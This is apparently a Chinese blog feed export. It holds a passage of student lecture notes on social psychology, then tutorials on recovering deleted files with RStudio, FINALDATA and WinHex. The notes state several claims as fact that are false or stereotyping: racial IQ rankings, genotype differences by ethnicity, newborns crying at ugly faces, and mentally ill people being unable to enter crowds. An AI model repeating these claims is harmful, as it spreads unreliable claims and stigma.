<h2 id="负面情绪有利于创造力的提升"><a href="#负面情绪有利于创造力的提升" class="headerlink" title="负面情绪有利于创造力的提升"></a>负面情绪有利于创造力的提升</h2><p>我们可以发现：凡是美国人不让中国搞的，我们中国都能搞出来，例如两弹一星，这体现了有压迫才有动力。一个反例如下：微软是如何打进中国市场的呢？他首先在中关村卖盗版微软操作系统、office，来打击中国操作系统及WPS（WPS是真的垃圾）的发展，当中国人沉浸在使用美国优质资源的时候，就会搁置本土行业的发展。当想要发展本土行业时，才发现已经离不开美国的产品了。<br> <strong>不恰当的快乐：精神病人思维广，弱智儿童欢乐多</strong></p>
<h2 id="人与人之间的联结关系"><a href="#人与人之间的联结关系" class="headerlink" title="人与人之间的联结关系"></a>人与人之间的联结关系</h2><p><strong>作为一个人，在逻辑上，是独立的</strong><br>我们常听到“<strong>女生哭了，后果很严重</strong>”，其实这是有科学依据的。<br>某个科学家做过这样一个实验，他们在女性哭的时候，收集她们的眼泪，然后涂在实验男性的鼻子下部（让他们闻到女孩子眼泪的气息），观察抹完后男性血液中的<strong>睾丸酮</strong>（雄性激素）含量变化。<img src="/images/loading.gif" data-original="/posts/fe25ace7/18457849-17a0d46aa3db9be0.png" alt><br>实验结果显示：抹完后<strong>男性的睾丸酮含量降低</strong>。<br>这个结果说明什么呢？<br>对于人来说，雄性激素过高会产生<strong>竞争、争斗</strong>心理，实验结果显示，女性的眼泪会降低男性的争斗心，减少其暴力倾向（这一点可以与邹振东的<strong>弱传播</strong>理论相结合）。这说明，<strong>人与人之间并不是相互独立的，而是互相影响的，没有人是一座孤岛</strong>。</p>
<p>在进化史上，雌雄异体是进化的一大突破和进步。而对于高等动物而言，<strong>嗅觉</strong>是一项基本能力，但也是较为重要的感觉。<br>前文我们有提到父母与婴儿的拥抱会使他们分泌催产素。但其实婴儿仅靠其父母的呵护是远远不够生存的（在进化上），于是其还有一大能力——促使人分泌催产素的<strong>婴儿体香</strong>，这是婴儿借助嗅觉这一利器将其身边的人感化（我想起了南宫问雅的净化能力），进而去呵护他、照顾他。<br>人与人的联结是有物质基础的，嗅觉对社群动物关系建立非常重要。爱人或者情侣之间，会莫名喜欢对方的体味（即使是汗臭味和脚臭，因此有爱情的酸臭味一说）。我们常看到“网友见光死”，这是因为他们未经过对方的嗅觉考验。而异地恋的情侣感情会变淡，这是因为时间久了他们会忘记（喜欢）彼此的气味（各位异地恋的伙伴不要打我）。</p>
<h1 id="人类性格成因"><a href="#人类性格成因" class="headerlink" title="人类性格成因"></a>人类性格成因</h1><p>​        <strong>五羟色胺</strong>是又名血清素，是影响人神经活跃程度的一种神经递质，五羟色胺的分泌速率和含量在生物层面（表现型=基因型+环境，这里未考虑后天环境因素）决定了人的性格特点（外向、内向）。与五羟色胺分泌有关的<strong>5-HTTLPR基因（快乐基因）</strong>有三种基因型：<strong>SS</strong>、<strong>SL</strong>、<strong>LL</strong>，不同基因型会转录翻译出不同的五羟色胺转运酶，这些酶会决定五羟色胺的转运速率。其中<strong>SS表现出的是内向的性格特点</strong>，<strong>LL表现出的是外向的性格特点</strong>。<br>​         据研究调查，<strong>东亚人大多数是SS基因型，西方人大部分是LL基因型</strong>，这也就解释了为什么东亚人大多数是含蓄内敛（今晚月色真美），西方人大多数是开放外向。</p>
<h1 id="人类的情绪偏好"><a href="#人类的情绪偏好" class="headerlink" title="人类的情绪偏好"></a>人类的情绪偏好</h1><p>有一项研究实验是这样：<br>         让实验者观看积极、中性、消极的脸，记录他们眼睛在不同照片停留的时间 ，实验结果显示，<strong>实验者对笑脸反应时间最短，注视时间最长</strong>，这体现了人们更喜欢积极的笑脸。如果我们想在人群中知道某个人对谁有好感，可以录下他的视频，用图像识别技术计算其在每个人脸部的停留时间，找出停留时间最长的那个人的脸即可。</p>
<h2 id="情绪偏好与年龄的关系"><a href="#情绪偏好与年龄的关系" class="headerlink" title="情绪偏好与年龄的关系"></a>情绪偏好与年龄的关系</h2><p>某个研究（实在想不出什么新词了_(:3」∠)_）是酱紫：<br>          给出两张相机广告图片，他们配图是一样的，但是上面写的是不同的标语，第一张是“<strong>Exloring the world</strong>”（探索未知世界），第二张是“<strong>Capture moment</strong>”(享受此刻），结果显示，年轻人觉得第一张广告更具有吸引力（购买冲动），老年人则更喜欢第二张广告。这是因为<strong>年轻人并无太大情绪偏好，更具有探索精神，他们既有积极情绪又有消极情绪</strong>；而<strong>老年人是积极情绪导向，更喜欢享受（晚年短暂）生活</strong>。我们常闻“少年不识愁滋味，为赋新词强说愁”、“哪有什么岁月静好，不过是有人替你负重前行”，这都体现了年轻人无偏好的情绪导向。<br>          对于<strong>劫后余生</strong>，这会让人瞬感生命短暂，会使人幸福感提升。当发生灾难时，<strong>人的年龄界限</strong>便会消失，年轻人也会发出类似迟暮之人的感慨。<strong>真正影响我们情绪偏好的，不是年龄的年幼，而是脑子里生命的长短</strong>。悲观的人容易发出人生苦短的感慨，乐观的人心理年龄就会比较小。</p>
<h2 id="埃里克森人格发展理论"><a href="#埃里克森人格发展理论" class="headerlink" title="埃里克森人格发展理论"></a>埃里克森人格发展理论</h2><p><img src="/images/loading.gif" data-original="/posts/fe25ace7/18457849-17ab4e605f08770e.jpg" alt><br>这边仅谈几点（其实是我上课走神了）：</p>
<ul>
<li>对于降临于世的婴儿，最需要的是<strong>安全</strong>，因此他们有选择信任的问题。<br>这边谈一个题外话：为什么中国人生玩孩子需要坐月子而美非人不用呢？是因为中国妇女身体素质太低吗？<br>其实，中国人和印度人是世界公认智商最高的种族，中国的待出生的婴儿头很大（智商高），中国妇女骨盆较小，因此生产很困难。统计数据显示，世界剖腹产率最高的是中国地区。而美非妇女婴儿头部小，骨盆大，容易生，因此她们生孩子消耗体力少，不用坐月子。</li>
<li><p>婴儿后期（2~4岁）的孩子开始出现通过假哭、闹来博取他人的同情，这是因为他们此时并没有过多的羞耻意识。</p>
</li>
<li><p>青少年期伴随着第二性征的出现，青春期的孩子会对自我角色定位产生混乱。</p>
</li>
</ul>
<h1 id="技术（主要是社交媒体）对人心理的影响"><a href="#技术（主要是社交媒体）对人心理的影响" class="headerlink" title="技术（主要是社交媒体）对人心理的影响"></a>技术（主要是社交媒体）对人心理的影响</h1><p>这边的人主要是指美国人（这节课我迟到了，又刚好遇到老外英文授课，英语菜鸡流下不争气的泪水T-T）</p>
<h2 id="研究一"><a href="#研究一" class="headerlink" title="研究一"></a>研究一</h2><p>​         准备一些成对一样的照片，一张有30-45likes，另一张只有0-15likes，将他们打乱，分成两组，一组中不会有相同的图片（即{$A_1,B_2,C_2,D_1$},{$A_2,B_1,C_1,D_2$}这样的分法），将参与者分成两组，统计他们对每张图的喜爱程度。</p>
<p><img src="/images/loading.gif" data-original="/posts/fe25ace7/18457849-72f3dd3ec221b001.jpg" alt="低得可怜的像素"></p>
<p>​        结果显示：<strong>同一张照片，30-45likes比0-15likes获得更多的喜欢。</strong><br>进一步研究，这是与人体大脑的奖赏中枢<strong>纹状体（The ventral striatum）</strong>有关的。<br>​         Many “likes” activate the ventral striatum. 很多的赞会激活纹状体。在参与者之间，<strong>很多赞的照片会比很少赞的激活奖赏中枢</strong>。因此，当我们看到赞很多的图片时，大脑的奖赏中枢就会被激活，我们就会对该图片萌生爱意，会给它点赞，于是，很多赞的图片就会获得越来越多的赞。（<strong>疯狂暗示给我点赞(ಡωಡ)</strong>）<br>​         不仅”likes”会对观看者产生影响，也会反向作用于图片发布者。年轻人非常关注“likes”。在突然间，你得到了大量的“likes”，意味着你得到了肯定，它可能会<strong>上瘾</strong>，因为你受到不断的鼓励，你就会喜欢发这类会获得很多赞的图片。研究表明，<strong>女孩们总是喜欢关注“likes”（的事物）和积极评论</strong>。</p>
<h2 id="研究二"><a href="#研究二" class="headerlink" title="研究二"></a>研究二</h2><p>选取两个年龄均为13的美国青少年作为实验者，让他们用自己的社交软件在不同时间发布不同的图片，统计获赞数。<br>结果显示，对于青春期的孩子，以下中收到更多的“likes”：</p>
<ul>
<li>Romantic relationships</li>
<li>Peer relationships</li>
<li>Individual identity formation</li>
</ul>
<p>这是因为在美国这种追求个人主义的文化中青春期的人希望独立于他们的家庭，有关家庭的图片获得更少；照片含有发布者（自拍）会比没有他自己获得更多的“likes”。</p>
<p>美国青年喜欢什么图片呢？<br>以下是赞统计排行：</p>
<ul>
<li>Romantic relationships</li>
<li>Solo Activity</li>
<li>Peer</li>
<li>Nature</li>
<li>Selfie</li>
<li>Family</li>
<li><p>Food</p>
</li>
<li><p>Violence</p>
</li>
</ul>
<h2 id="媒介沟通发展的影响"><a href="#媒介沟通发展的影响" class="headerlink" title="媒介沟通发展的影响"></a>媒介沟通发展的影响</h2><p>1）与面对面交流相比，<strong>媒介沟通（现主要指通信交流）会减少人的亲密行为和亲密感</strong>。<br>2）媒体技术的大量使用与个人主义的发展有很大关系。<strong>因为崇尚个人主义，青少年用媒体技术彰显个性。但是反过来，媒体技术的发展，却促使青少年有更多的个人主义精神。</strong></p>
<p>这边谈一点：<br>中国是大陆农业文明，是<strong>礼俗社会</strong>，集体主义更强（现在貌似个人主义也不弱）；<br>西方是海洋文明，依赖官僚体制、城市体制下的规则，是<strong>法理社会</strong>，个人主义更强。</p>
<h2 id="CONCLUSION"><a href="#CONCLUSION" class="headerlink" title="CONCLUSION"></a>CONCLUSION</h2><p>1）使用技术的沟通（与面对面交流相比），人和人之间并不是很亲密，距离更远，幸福感更低。<br>2）青少年喜欢社交媒体内容的原因：<br>&emsp;A、生物原因：有越多“likes”的图片会激活人的奖赏中枢，使人成瘾（别人喜欢我们就喜欢）<br>&emsp;B、行为上与青春期相关，与自身问题相关，主题符合<br>&emsp;C、与个人主义相关，价值观符合</p>
<p>​         <strong>我们在社交媒体表现出来的偏好是社会（受众）驱动型，别人喜欢什么我们就喜欢什么。我们渴望在虚拟的网络空间追求个性，实际上却被社会（受众）牵着走，这是一种被动从众行为，无声无息，悄然渗入。</strong><br>​        这也解释了为什么本文章初特朗普大数据团队的做法如此奏效。</p>
<h1 id="社会群体对个人的影响"><a href="#社会群体对个人的影响" class="headerlink" title="社会群体对个人的影响"></a>社会群体对个人的影响</h1><p>柏拉图曾言：西方人骨子里是追求完美的世界，为真理执着的精神。</p>
<p>但是这却导致了两次世界大战。西方人会道歉。这两点导致西方人很有实力。</p>
<p>亚里士多德性格说：</p>
<ul>
<li><p>年轻人：欲念，勇敢，信心……</p>
</li>
<li><p>老年人：多疑，胆怯，自私……</p>
</li>
</ul>
<p>社会群体：生理——人生——历史</p>
<h2 id="社会助长效应（Social-facilitation）"><a href="#社会助长效应（Social-facilitation）" class="headerlink" title="社会助长效应（Social facilitation）"></a>社会助长效应（Social facilitation）</h2><p><strong>蟑螂迷宫实验</strong><img src="/images/loading.gif" data-original="/posts/fe25ace7/18457849-dff7471a63e04ef5.png" alt><br>准备四个迷宫：</p>
<p><strong>A:简单迷宫：直线通道，只有一只蟑螂在迷宫</strong><br><strong>B:简单迷宫：直线通道，两侧设有其他蟑螂“观众席”</strong><br><strong>C:复杂迷宫：曲线通道，只有一只蟑螂在迷宫爬</strong><br><strong>D:复杂迷宫：曲线通道，两侧设有其他蟑螂“观众席”</strong></p>
<p>实现结果显示：<br><strong>蟑螂在简单迷宫找到出口的时间比在复杂迷宫里时间短；</strong><br><strong>但是对于简单迷宫和复杂迷宫</strong><br><strong>在简单迷宫里，有观众比没观众的情形用时短；<br>在复杂迷宫里，有观众比没观众的情形用时长。</strong><br>我们可以得出什么结论呢？<br><img src="/images/loading.gif" data-original="/posts/fe25ace7/18457849-e0fc15b00bc4904f.png" alt="扎伊翁茨关于社会助长理论的模型"><br>          <strong>对于人类，关心他人意见者，以及在不认识观众的情况下这种效应表现得最为强烈。</strong><br>          <strong>在完成简单任务或熟练任务时，如果有观察者在场（观众效应），或者有竞争者（合作者效应），将会激发优于独处时的表现的倾向。</strong><br>           <strong>但对于复杂任务或不熟练任务，情况则相反。</strong><br>           因此，当完成简单任务时，在群体环境下容易产生社会促进，然而在完成复杂任务时，要独立完成。</p>
<h2 id="去个性化（Deindividuation）"><a href="#去个性化（Deindividuation）" class="headerlink" title="去个性化（Deindividuation）"></a>去个性化（Deindividuation）</h2><p>​         亦可叫<strong>去压抑化</strong>、<strong>去抑制化</strong>，是指<strong>个人在群体压力或者群体意识影响下，会导致自我导向功能的削弱或责任感的丧失，产生一些个人单独活动时是不会出现的行为</strong>。<br>去个性化存在的外在条件有两个：<br>​    一是<strong>身份的隐匿</strong>；<br>​    二是<strong>责任的模糊化</strong>。<br><img src="/images/loading.gif" data-original="/posts/fe25ace7/18457849-cbc59fd7ebedb9cf.png" alt="去个性化的理论模型和相关现象">前提条件导致去个性化的内在状态，这些又会导致外显的行为，这些行为在其他情况是可控的。</p>
<ul>
<li>现象1：美国著名的<strong>格罗维斯谋杀案</strong>，在场38个人眼睁睁看着受害人被劫匪杀害。这是<strong>旁观者效应</strong>使然，在人多的情况下 ，人的责任感就会降低。若我们是受害人，<strong>我们呼救时不要无目的地找人帮忙，而是指名道姓地找最近的人帮忙，以增强某人的个人责任感以达到获救</strong>。</li>
<li>现象2：<strong>精神病人不能去人多的地方</strong>，这是因为精神病人本就是去个性化的个体，在人多的地方会容易引爆其去个性化转态，导致其失控。</li>
<li>现象3：游行人群失控。当游行的人群规模相当大时，这大大增加了<strong>匿名性</strong>，就会导致反社会暴力的发生。具体可参考希腊暴乱、最近的HK事件。<strong>所以我们并不提倡搞游行活动</strong>！</li>
<li>现象3：自杀怂恿。正所谓<strong>法不责众</strong>，<strong>群体规模越大产生的匿名性和责任扩散越大，同时人们在群体中更容易处于高度的唤醒状态，更兴奋</strong>。当某人在准备跳楼的时候，下面有很多人围观，他是跳还是不跳呢。其实很多时候围观的人会刺激、催促这个人跳楼。研究发现夜幕笼罩和人群数量都与自杀怂恿有关。<strong>晚上6点以后发生自杀怂恿的概率都比之前高4倍，人数超过300人时概率是不足300人的2倍。</strong></li>
</ul>
<h1 id="对自我的认识"><a href="#对自我的认识" class="headerlink" title="对自我的认识"></a>对自我的认识</h1><h2 id="镜像我"><a href="#镜像我" class="headerlink" title="镜像我"></a>镜像我</h2><p>​       给婴儿脸上涂红点，然后让他照镜子，<strong>一岁半前的婴儿是摸镜子，一岁半后是摸自己的脸</strong>，说明婴儿在一岁半后才能识别镜像我。</p>
<p><strong>五大人格理论</strong>：<br><strong>开放性（openness）</strong>：易于接受新事物，具有想象、审美、情感丰富、求异、创造、智能等特质。<br><strong>尽责性（conscientiousness）</strong>：显示胜任、公正、条理、尽职、成就、自律、谨慎、克制等特点。<br><strong>外倾性（extroversion）</strong>：表现出热情、社交、果断、活跃、冒险、乐观等特质。<br><strong>宜人性（agreeableness）</strong>：有为他人着想的特质，具有信任、利他、直率、依从、谦虚、移情等特质。<br><strong>神经质性（neuroticism）</strong>：难以平衡焦虑、敌对、压抑、自我意识、冲动、脆弱等情绪的特质，即不具有保持情绪稳定的能力。</p>
<p>五个英文单词首字母连起来是<strong>OCEAN</strong>（海洋，寓意人格深不可测）<br>在这五大维度里，其中<strong>尽责性</strong>是人作为高等动物特有的特性。<br>人的性格（外向性）与<strong>多巴胺</strong>水平有关。<br>人的情绪性与<strong>五羟色胺</strong>含量有关，五羟色胺多情绪越稳定，抗压能力强。</p>
<p>相关影响：</p>
<ul>
<li>男女差异：<strong>女性容易情绪化，但是宜人性高</strong></li>
<li>学习好的人通常<strong>高尽责性，高开放性，高宜人性</strong>。3、据统计显示，当总统的人在原生家庭里通常是<strong>老大</strong>，当科学家的人在原生家庭里通常是<strong>老小</strong>。</li>
<li>结婚（恋爱）后<strong>外向性会下降，开放性会下降</strong>（因为只对对象好，忽视其他人），分手后<strong>宜人性下降</strong>。</li>
<li>离婚后<strong>尽责性上升</strong>，生子和退休后<strong>尽责性下降</strong>。（产后抑郁症）</li>
<li>当人们在找到第一份工作的时候<strong>尽责性会上升</strong>。（开始很认真，后面老油条）<h2 id="自我觉察"><a href="#自我觉察" class="headerlink" title="自我觉察"></a>自我觉察</h2></li>
</ul>
<p>有的人自我介绍是先表明社会身份，有的人则是先介绍名字。<br>研究发现：<strong>理工科思维方式是独立我，人文社科思维方式是他人我</strong>。<br>文化差异：<strong>西方人思维方式是独立我，东方人思维方式是他人我</strong>。</p>
<ul>
<li><p>我们认为下面这些真理是不言而喻的：人人生而平等，造物者富裕他们若干不可剥夺的权利，其中包括生命权、自由权和追求幸福的权利。——《独立宣言》</p>
</li>
<li><p>夫仁者，己欲立而立人。——《论语》</p>
</li>
</ul>
<h2 id="文化差异"><a href="#文化差异" class="headerlink" title="文化差异"></a>文化差异</h2><p>亚洲人做生意，即讲关系又讲公平，而欧美人很少讲公平，因为北美人知道关系是亚洲人的软肋。</p>
<p>SOLER原则（Egan，1997）</p>
<ul>
<li>S 坐着面对别人</li>
<li>O 姿势要自然开放</li>
<li>L 身体微微前倾</li>
<li><p>E 目光接触</p>
</li>
<li><p>R 放松</p>
</li>
</ul>
<p><strong>女性比男性更容易自我表露。</strong></p>
<p>实验：<br>让实验者看一些词语，并选择是、否项，看这个词是否符合自己，结果显示，当出现漂亮、善良的词时，参与者按得比较快，当出现不好的词时，参与者按得比较慢。</p>
<p>这个实验间接说明了每个人都有自尊，内心里都有一个优秀、强大的自我。<br>中欧美人自尊均很强。</p>
<h1 id="共同生活与生物进化"><a href="#共同生活与生物进化" class="headerlink" title="共同生活与生物进化"></a>共同生活与生物进化</h1><p><strong>人类归属的需要：</strong></p>
<ul>
<li>温暖和安全</li>
<li>家庭帮助后代生存</li>
<li>友谊联结避免攻击</li>
<li>生理和心理的痛苦</li>
</ul>
<h2 id="人际吸引"><a href="#人际吸引" class="headerlink" title="人际吸引"></a>人际吸引</h2><p>让刚出生的婴儿看一些图片，婴儿们都喜欢漂亮的人，例如玛丽·莲梦露，而当他们看到丑陋的人脸时，会嚎啕大哭。<br>这是因为生物进化的选择。<br><strong>人类对于美的追求，是出于对生存的需求，是进化的结果，美的人一般更加健康安全，他们就可能活更久，掌握更多资源</strong></p>
<h2 id="晕轮效应"><a href="#晕轮效应" class="headerlink" title="晕轮效应"></a>晕轮效应</h2><p>​          晕轮效应最早是由美国著名心理学家<strong>爱德华·桑戴克</strong>于20世纪20年代提出的。他认为，人们对人的认知和判断往往只从局部出发，扩散而得出整体印象，也即常常以偏概全。 <sup>[1]</sup>  一个人如果被标明是好的，他就会被一种积极肯定的光环笼罩，并被赋予一切都好的品质；如果一个人被标明是坏的，他就被一种消极否定的光环所笼罩，并被认为具有各种坏品质。这就好象刮风天气前夜月亮周围出现的圆环（月晕），其实呢，圆环不过是月亮光的扩大化而已。据此，桑戴克为这一心理现象起了一个恰如其分的名称“晕轮效应”，也称作“光环作用”。<br>​          心理学家戴恩做过一个这样的实验。他让被试者看一些照片，照片上的人有的很有魅力，有的无魅力，有的中等。然后让被试者在与魅力无关的特点方面评定这些人。结果表明，被试者对有魅力的人比对无魅力的赋予更多理想的人格特征，如和蔼、沉着，好交际等。<br>​          晕轮效应不但常表现在以貌取人上，而且还常表现在以服装定地位、性格，以初次言谈定人的才能与品德等方面。在对不太熟悉的人进行评价时，这种效应体现得尤其明显。<br>​         当认知者对一个人的某种特征形成好或坏的印象后，他还倾向于据此推论该人其他方面的特征。本质上晕轮效应是一种以偏概全的认知上的偏误。晕轮效应愈来愈多地被应用在企业管理上，其对组织管理的负面影响主要是体现在各种组织决策上。<br>​          人际吸引正是依靠这种晕轮效应维系。</p>
<h2 id="繁殖适应性"><a href="#繁殖适应性" class="headerlink" title="繁殖适应性"></a>繁殖适应性</h2><p>人类外表进化趋势：</p>
<p><strong>平均脸（大众化）、左右对称性、沙漏型身材、第二性征</strong></p>
<p>真正影响美丑判断的不是身材胖瘦而是身材比例：<br>                    <strong>腰围：臀围=0.618（黄金比例）</strong></p>
<p>完美男性体型：<strong>倒三角型</strong><br>完美女性体型：<strong>沙漏型</strong></p>
<p>美貌代表着健康，因此男性喜欢美女（且越年轻越健康），<br>女性喜欢年长男（社会经济更高一些，更可靠，更安全）。</p>
<p>异性偏好：</p>
<ul>
<li><strong>男性更注重外表</strong><br>&emsp; <strong>光滑皮肤，浓密头发，丰富嘴唇，更细的腰围</strong></li>
<li><strong>女性更注重成熟、地位</strong><br>&emsp; <strong>体格强壮，生产能力强，较高的社会地位</strong></li>
</ul>
<p>美女常嫁给普通男，暖男常娶相貌平平的女性。</p>
<p>相爱容易（激情）相处难（亲密）。</p>
<h2 id="亲近与相似"><a href="#亲近与相似" class="headerlink" title="亲近与相似"></a>亲近与相似</h2><h3 id="曝光效应"><a href="#曝光效应" class="headerlink" title="曝光效应"></a>曝光效应</h3><p><strong>你看到的次数越多，你越有可能喜欢它</strong><br>比如一个相貌平平的男性想追求一个美女，那么他可以常常出现在美女的视界里，就可能让美女喜欢上他。</p>
<h3 id="相似吸引"><a href="#相似吸引" class="headerlink" title="相似吸引"></a>相似吸引</h3><p>社会阶层和宗教信仰<br>健康、体貌<br>领导力、敏感性</p>
<h3 id="相生相克"><a href="#相生相克" class="headerlink" title="相生相克"></a>相生相克</h3><p>依赖——关心<br>内向——外向<br>而非诚实、责任、出色</p>
<h3 id="亲密关系：爱情三角理论"><a href="#亲密关系：爱情三角理论" class="headerlink" title="亲密关系：爱情三角理论"></a>亲密关系：爱情三角理论</h3><p><img src="/images/loading.gif" data-original="/posts/fe25ace7/18457849-e725728d11216781.png" alt></p>
<h2 id="社会影响"><a href="#社会影响" class="headerlink" title="社会影响"></a>社会影响</h2><h3 id="变色龙效应"><a href="#变色龙效应" class="headerlink" title="变色龙效应"></a>变色龙效应</h3><p>​         变色龙效应，又称“无意识模仿”，是指人们在社会交流时会相互无意识地模仿对方的一些动作、表情和行为方式。其在个体社会认知以及人际交流上扮演着重要的角色。大量以西方人为研究对象的研究已证明：在西方群体中，变色龙效应是一种普遍存在的心理现象。</p>
<h3 id="电梯实验"><a href="#电梯实验" class="headerlink" title="电梯实验"></a>电梯实验</h3><p>​         事先安排实验助手混在电梯里，此时电梯只有一个非实验助手（被迫参与实验者，下称参与者），让实验助手们朝向同一个方向，发现参与者最后也会转向一样的朝向，让实验助手都不戴帽子，则参与者也会拿下帽子，让实验助手们戴上帽子，参与者也会戴上帽子。<br>​         这是因为，<strong>在狭小空间里，群体的高度一致性，会给人带来巨大压力</strong>。</p>
<h3 id="服从权威效应"><a href="#服从权威效应" class="headerlink" title="服从权威效应"></a>服从权威效应</h3><p>​          1961年耶鲁大学心理学助理教授斯坦利·米尔格兰姆做的心理学实验，证明了：<strong>人类有一种服从权威命令的天性，在某些情景下，人们会背叛自己一直以来遵守的道德规范，听从权威人士去伤害无辜的人</strong>。<br>​          参与者被告知这是一项关于“体罚对于学习行为的效用”的实验，并被告知自身将扮演“老师”的角色，以教导隔壁房间的另一位参与者——“学生”，然而学生事实上是由实验人员所假冒的。<br>​          参与者将被告知，他被随机挑选为担任“老师”，并获得了一张“答案卷”。实验小组并向他说明隔壁被挑选为“学生”的参与者也拿到了一张“题目卷”。但事实上两张纸都是“答案卷”，而所有真正的参与者都是“老师”。“老师”和“学生”分处不同房间，他们不能看到对方，但能隔著墙壁以声音互相沟通。有一位参与者甚至被事先告知隔壁参与者患有心脏疾病。<br>“老师”被给予一具据称从45伏特起跳的电击控制器，控制器连结至一具发电机，并被告知这具控制器能使隔壁的“学生”受到电击。“老师”所取得的答案卷上列出了一些搭配好的单字，而“老师”的任务便是教导隔壁的“学生”。老师会逐一朗读这些单字配对给学生听，朗读完毕后老师会开始考试，每个单字配对会念出四个单字选项让学生作答，学生会按下按钮以指出正确答案。如果学生答对了，老师会继续测验其他单字。如果学生答错了，老师会对学生施以电击，每逢作答错误，电击的伏特数也会随之提升。<br>​           参与者将相信，学生每次作答错误会真的遭到电击，但事实上并没有电击产生。在隔壁房间里，由实验人员所假冒的学生打开录音机，录音机会搭配著发电机的动作而播放预先录制的尖叫声，随著电击伏特数提升也会有更为惊人的尖叫声。当伏特数提升到一定程度后，假冒的学生会开始敲打墙壁，而在敲打墙壁数次后则会开始抱怨他患有心脏疾病。接下来当伏特数继续提升一定程度后，学生将会突然保持沉默，停止作答、并停止尖叫和其他反应。<br>​           在进行实验之前，米尔格伦曾对他的心理学家同事们做了预测实验结果的测验，他们全都认为只有少数几个人——10%甚至是只有1%，会狠下心来继续惩罚直到最大伏特数。<br>​           结果在米尔格伦的第一次实验中，百分之65（40人中的26人）的参与者都达到了最大的450伏特惩罚，尽管他们都表现出不太舒服；每个人都在伏特数到达某种程度时暂停并质疑这项实验，一些人甚至说他们想退回实验的报酬。没有参与者在到达300伏特之前坚持停止。</p>
<p><strong>远程攻击</strong>：<br><strong>处罚者距离受罚者距离越远，内心就越不会感觉受到谴责，越可能做出出格的事情</strong>。</p>
<p><strong>募款时机</strong>：人们进教堂时捐款多还是出教堂时捐款多？答案是<strong>进</strong>，因为做礼拜之前人们饱含罪意，出教堂就认为忏悔后就无罪了（。。。。）。同理洗手前捐款多。<br>法官洗手后对罪人判罪更重。</p>
<p><strong>从众压力</strong>：公开会使少数人的选举权受到压力。</p>
 <font face="微软雅黑" color="#1f4f5f" size="10">完结撒花\^-^</font>

]]></content>
      <categories>
        <category>心理学</category>
      </categories>
  </entry>
  <entry>
    <title>数据恢复之已删除文件恢复（下）</title>
    <url>/posts/fe30eb9a/</url>
    <content><![CDATA[<p>这次我们使用数据恢复软件对磁盘文件进行恢复，即使是小白也可轻松上手！<a id="more"></a></p>
<h1 id="第一款软件是RStudio"><a href="#第一款软件是RStudio" class="headerlink" title="第一款软件是RStudio"></a>第一款软件是<strong>RStudio</strong></h1><p>进入软件界面，右击要恢复数据的磁盘<img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-39972236a94470a9.png" alt></p>
<p>点击扫描</p>
<p><img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-522444c3fb90d0be.png" alt></p>
<p>弹出此窗口</p>
<p>1）对于文件系统，如果不知道文件系统类型就全选，其中：<strong>Ext2/Ext3/Ext4是linux文件系统，UFS是unix文件系统，HFS、APFS是苹果文件系统</strong>，若知道就选择其中几个，已知文件类型也是，这可以加快扫描速度，道理显然。<br>2）这边的保存到文件指的是断点扫描功能，在扫描较大文件数磁盘时，可以暂停。再次扫描时，读取扫描记录（log），就不会扫描已扫描的内容，而是从未扫描的内容开始扫描。</p>
<p>点击扫描，可以发现很快就扫描完了</p>
<p><img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-668ffb823f3f85bb.png" alt></p>
<p>这边呢，我们发现出现一个带<strong>Recognized</strong>的文件，这就是扫描后的磁盘，双击点入。</p>
<p><img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-3f3fb33ddaaeb38b.png" alt></p>
<p>即可发现被删除的文件（如果是被删除后放在回收站，这边会显示回收站未被删除的文件）<br><strong>右键</strong>想恢复的文件点击<strong>恢复</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-53b284892720f0f2.png" alt><img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-01528a9bddf6c796.png" alt></p>
<p>这边选择需要的选项，再按确定就可以</p>
<p><img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-bae6e97caafe03b1.png" alt></p>
<p>这就可以很轻松地恢复文件</p>
<p><strong>对于格式化的磁盘，依然可以用软件恢复，用法和上述步骤一样，但是注意，FAT32文件系统的磁盘格式化后可完全恢复，NTFS可能不能恢复完全，这是因为NTFS系统格式化时会产生很多隐藏文件和冗余文件（元文件之类的）（可以发现NTFS系统格式化之后可用空间会比原磁盘空间小一些），可能会覆盖原数据，造成无法恢复。另外，笔记本磁盘恢复也是有一定阻碍的，现在很多笔记本电脑使用闪存，闪存一通电其数据就会发生变化，就会无法恢复原来的数据。</strong></p>
<h1 id="另一款软件是FINALDATA"><a href="#另一款软件是FINALDATA" class="headerlink" title="另一款软件是FINALDATA"></a>另一款软件是<strong>FINALDATA</strong></h1><p>其优点是，占用空间很小，就几M，支持<strong>office文件恢复、电子邮件恢复、数据库恢复</strong>，仅此而已，其他性能远比不上RStudio（毕竟是要钱的），UI界面巨丑，极具工业画风。</p>
<p>加载入要恢复的磁盘<img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-26332bc9fc395d03.png" alt></p>
<p>点击确定</p>
<p><img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-48e9ae87eb7b121d.png" alt></p>
<p>忍不住吐槽了，19G居然要这么久</p>
<p><img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-a99a2ca9c550d239.png" alt></p>
<p>扫描结束如上图</p>
<p>右键就可以进行恢复，但是这边的详细保存地址需要自己填</p>
<p><img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-6b90196e5cfe65b9.png" alt><img src="/images/loading.gif" data-original="/posts/fe30eb9a/18457849-809056b7e4359acc.png" alt></p>
<p>同样也是可以成功完成恢复的！</p>
]]></content>
      <categories>
        <category>电子数据擦除与恢复技术</category>
      </categories>
  </entry>
  <entry>
    <title>数据恢复之已删除文件恢复（上）</title>
    <url>/posts/468c8cff/</url>
    <content><![CDATA[<p>本文案例对象：分区类型：MBR，文件系统：FAT32<a id="more"></a></p>
<p> <strong>用Winhex对数据内容进行查找提取</strong></p>
<h1 id="目标1：数据恢复教程-txt"><a href="#目标1：数据恢复教程-txt" class="headerlink" title="目标1：数据恢复教程.txt"></a>目标1：数据恢复教程.txt</h1><p>首先将“数据恢复教程”转化为ASCII码<img src="/images/loading.gif" data-original="/posts/468c8cff/18457849-83e700c8791ed88b.png" alt></p>
<p>由于它是长文件名（超过8个字节），因此只取前6个字节：CAFDBEDDBBD6<br>点击Winhex分区的根目录，用十六进制查找文件名</p>
